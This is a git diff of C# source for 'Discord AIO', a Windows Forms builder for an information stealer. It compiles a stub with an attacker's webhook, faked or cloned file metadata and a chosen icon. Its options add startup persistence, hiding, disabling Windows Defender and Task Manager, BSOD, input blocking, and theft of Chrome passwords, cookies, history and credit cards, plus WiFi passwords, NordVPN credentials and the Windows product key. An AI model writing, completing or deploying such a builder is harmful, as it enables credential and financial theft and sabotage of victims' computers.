@@ -16,6 +16,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Windows.Media.Imaging;
 
 namespace discordAIO
 {
@@ -37,10 +38,14 @@ namespace discordAIO
             builderPage.Visible = false;
 
 
+            // Utils
+            this._randomChars = new RandomCharacters();
+            this.randomFileInfo_0 = new RandomInfo(this.randomCharacters_0);
+
             CheckProtection();
 
 
-        //    Scintilla();
+            Scintilla();
             DiscordRPC();
         }
 
@@ -92,14 +97,17 @@ namespace discordAIO
             });
         }
 
-      /*  void Scintilla()
+      void Scintilla()
         {
             scintilla1.Lexer = Lexer.Cpp;
             scintilla1.StyleResetDefault();
             scintilla1.Styles[Style.Default].Font = "Consolas";
             scintilla1.Styles[Style.Default].Size = 10;
+            scintilla1.Styles[Style.Default].BackColor = Color.Black;
+            scintilla1.Styles[Style.Default].ForeColor = Color.DarkRed;
+
             scintilla1.StyleClearAll();
-            scintilla1.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.Silver;
+            scintilla1.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.DarkRed;
             scintilla1.Styles[Style.Cpp.Comment].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
             scintilla1.Styles[Style.Cpp.CommentLine].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
             scintilla1.Styles[Style.Cpp.CommentLineDoc].ForeColor = System.Drawing.Color.FromArgb(128, 128, 128);
@@ -113,7 +121,10 @@ namespace discordAIO
             scintilla1.Styles[Style.Cpp.Operator].ForeColor = System.Drawing.Color.Purple;
             scintilla1.Styles[Style.Cpp.Preprocessor].ForeColor = System.Drawing.Color.Maroon;
             scintilla1.Margins[0].Width = 16;
-        } */
+            scintilla1.Styles[Style.LineNumber].BackColor = Color.FromArgb(10, 10, 10);
+            scintilla1.ScrollWidth = 1;
+
+        }
 
         private void Solid_Paint(object sender, PaintEventArgs e)
         {
@@ -532,6 +543,272 @@ namespace discordAIO
             tokensPage.Visible = false;
             webhooksPage.Visible = false;
             mainPage.Visible = false;
+        }
+
+        // Handlers
+        private readonly Random _random = new Random();
+        private readonly RandomCharacters _randomChars;
+        private readonly RandomCharacters randomCharacters_0;
+        private readonly RandomInfo randomFileInfo_0;
+
+        private string Title = "N/A";
+        private string Description = "N/A";
+        private string Product = "N/A";
+        private string Company = "N/A";
+        private string Copyright = "N/A";
+        private string Trademark = "N/A";
+        private string MajorVersion = "N/A";
+        private string MinorVersion = "N/A";
+        private string BuildPart = "N/A";
+        private string PrivatePart = "N/A";
+
+        // Builder
+        private void builderButton_Click(object sender, EventArgs e)
+        {
+            if (label24.Text == "None")
+            {
+                MessageBox.Show("You need to generate or clone file info.", "Discord AIO");
+            }
+            else
+            {
+                label26.Text = "Opening explorer...";
+                try
+                {
+                    using (SaveFileDialog saveFileDialog = new SaveFileDialog())
+                    {
+                        saveFileDialog.Filter = "Executable (*.exe)|*.exe";
+                        if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                        {
+                            label26.Text = "Creating file...";
+                            string text = "x";//Properties.Resources.stub;
+                            text = text.Replace("DiscordAIO", _randomChars.getRandomCharacters(_random.Next(10, 20)));
+                            text = text.Replace("%Title%", Title);
+                            text = text.Replace("%Description%", Description);
+                            text = text.Replace("%Product%", Product);
+                            text = text.Replace("%Company%", Company);
+                            text = text.Replace("%Copyright%", Copyright);
+                            text = text.Replace("%Trademark%", Trademark);
+                            text = text.Replace("%v1%", MajorVersion);
+                            text = text.Replace("%v2%", MinorVersion);
+                            text = text.Replace("%v3%", BuildPart);
+                            text = text.Replace("%v4%", PrivatePart);
+                            text = text.Replace("%Guid%", Guid.NewGuid().ToString());
+                            text = text.Replace("AIOwebhook", textBox2.Text);
+                            label26.Text = "File created. Please wait...";
+                            Thread.Sleep(1000);
+                            label26.Text = "Creating additional options...";
+                            // Add to Startup
+                            if (checkBox1.Checked)
+                            {
+                                text = text.Replace("//startupaio", "Startup();");
+                            }
+                            // Hide stealer
+                            if (checkBox23.Checked)
+                            {
+                                text.Replace("//hideme", "HideFile();");
+                            }
+                            // Fake error
+                            if (checkBox5.Checked)
+                            {
+                                text = text.Replace("//errorhere", "Error();");
+                                text = text.Replace("titleError", textBox6.Text);
+                                text = text.Replace("messageError", textBox7.Text);
+                            }
+                            // BSOD
+                            if (checkBox6.Checked)
+                            {
+                                text = text.Replace("//bsodlmao", "BSOD();");
+                            }
+                            // Task Manager
+                            if (checkBox3.Checked)
+                            {
+                                text = text.Replace("//killctrlaltdel", "KillTM();");
+                            }
+                            // Windows Defender
+                            if (checkBox2.Checked)
+                            {
+                                text = text.Replace("//killdefender", "Defender.KillDefender();");
+                            }
+                            // Input
+                            if (checkBox24.Checked)
+                            {
+                                text = text.Replace("//killinput", "BlockInput();");
+                            }
+                            // Websites
+                            if (checkBox7.Checked)
+                            {
+                                text = text.Replace("//killweb", "KillWebsites();");
+                            }
+                            // Internet
+                            if (checkBox4.Checked)
+                            {
+                                text = text.Replace("//killinternet", "KillWIFI();");
+                            }
+                            // Desktop picture
+                        //    if (bunifuCheckBox9.Checked)
+                        //    {
+                        //        text = text.Replace("//takepic", "TakePicture();");
+                        //    }
+                            // Jumpscare
+                            if (checkBox8.Checked)
+                            {
+                                text = text.Replace("//jumpscare", "Jumpscare();");
+                            }
+                            // Custom plugin
+                            if (checkBox16.Checked)
+                            {
+                                text = text.Replace("//custom", "CustomPlugin();");
+                                text = text.Replace("//customcodehere", scintilla1.Text);
+                            }
+                            // Windows product key
+                            if (checkBox9.Checked)
+                            {
+                                text = text.Replace("//winkey", "WinProductKey();");
+                            }
+
+
+
+                            // Passwords
+                            if (checkBox15.Checked)
+                            {
+                                text = text.Replace("//stealpasses", "Chrome.RunPass();");
+                            }
+                            // Cookies
+                            if (checkBox14.Checked)
+                            {
+                                text = text.Replace("//stealcookies", "Chrome.RunCookies();");
+                            }
+                            // History
+                            if (checkBox11.Checked)
+                            {
+                                text = text.Replace("//stealhistory", "Chrome.RunHis();");
+                            }
+                            // CC
+                            if (checkBox12.Checked)
+                            {
+                                text = text.Replace("//stealcreditcard", "Chrome.RunCC();");
+                            }
+
+
+                            // WIFI passwords
+                            if (checkBox10.Checked)
+                            {
+                                text = text.Replace("//stealwifi", "StealWIFI();");
+                            }
+                            // NordVPN
+                            if (checkBox13.Checked)
+                            {
+                                text = text.Replace("//stealnord", "NordVPN.Save();");
+                            }
+
+
+
+
+                            label26.Text = "Additional options created. Compiling...";
+                            Thread.Sleep(500);
+                            if (Compiler.AIOcompilation(text, saveFileDialog.FileName, string.IsNullOrWhiteSpace(label33.Text) ? null : label33.Text))
+                            {
+                                label26.Text = "Saved as " + saveFileDialog.FileName;
+                                MessageBox.Show("Compilation done.", "Discord AIO");
+                            }
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    label26.Text = ex.Message;
+                }
+            }
+        }
+
+        // File info generate button
+        private void button14_Click(object sender, EventArgs e)
+        {
+            FileInfo randomFileInfo = randomFileInfo_0.getRandomFileInfo();
+            Title = randomFileInfo.Title;
+            Description = randomFileInfo.Description;
+            Product = randomFileInfo.Product;
+            Company = randomFileInfo.Company;
+            Copyright = randomFileInfo.Copyright;
+            Trademark = randomFileInfo.Trademark;
+            MajorVersion = randomFileInfo.MajorVersion;
+            MinorVersion = randomFileInfo.MinorVersion;
+            BuildPart = randomFileInfo.BuildPart;
+            PrivatePart = randomFileInfo.PrivatePart;
+
+            label24.Text = Description;
+        }
+        // File info clone button
+        private void button15_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                string mTitle = "null";
+                string mDescription = "null";
+                string mProduct = "null";
+                string mCompany = "null";
+                string mCopyright = "null";
+                string mTrademark = "null";
+                string mMajorVersion = "null";
+                string mMinorVersion = "null";
+                string mBuildPart = "null";
+                string mPrivatePart = "null";
+
+                OpenFileDialog cloningDialog = new OpenFileDialog();
+                cloningDialog.Filter = "Executable (*.exe)|*.exe";
+
+                if (cloningDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                {
+                    FileVersionInfo info = FileVersionInfo.GetVersionInfo(Path.GetDirectoryName(cloningDialog.FileName) + "\\" + cloningDialog.FileName);
+
+                    using (Stream fs = File.Open(Path.GetDirectoryName(cloningDialog.FileName) + "\\" + cloningDialog.FileName, FileMode.Open, FileAccess.ReadWrite))
+                    {
+                    //    BitmapDecoder decoder =
+                    //    BitmapDecoder.Create(fs, BitmapCreateOptions.None, BitmapCacheOption.Default);
+                    //    BitmapFrame frame = decoder.Frames[0]; // the first frame with the metadata
+                    //    BitmapMetadata metadata = frame.Metadata as BitmapMetadata;
+                    //    if (metadata != null)
+                     //   {
+                    //        mTitle = metadata.Title;
+//
+                     //       mCompany = metadata.Author.ToString();
+                     //       mCopyright = metadata.Copyright;
+                            // examine metadata.Title, metadata.Copyright
+                     //   }
+                        fs.Close();
+                    }
+
+                }
+                label24.Text = mDescription;
+                MessageBox.Show(mTitle);
+                MessageBox.Show(mCompany);
+                MessageBox.Show(mCopyright);
+                MessageBox.Show(Path.GetDirectoryName(cloningDialog.FileName) + "\\" + cloningDialog.FileName);
+            }
+            catch
+            {
+                MessageBox.Show("Something went wrong.", "Discord AIO");
+            }
+        }
+
+        // Program icon
+        private void button16_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                OpenFileDialog icOpen = new OpenFileDialog();
+                icOpen.Filter = "Icon (*.ico)|*.ico";
+
+                if (icOpen.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                {
+                    pictureBox3.Image = new Bitmap(icOpen.FileName);
+                    label33.Text = icOpen.FileName;
+                }
+            }
+            catch
+            {
+
+            }
         }
     }
 }
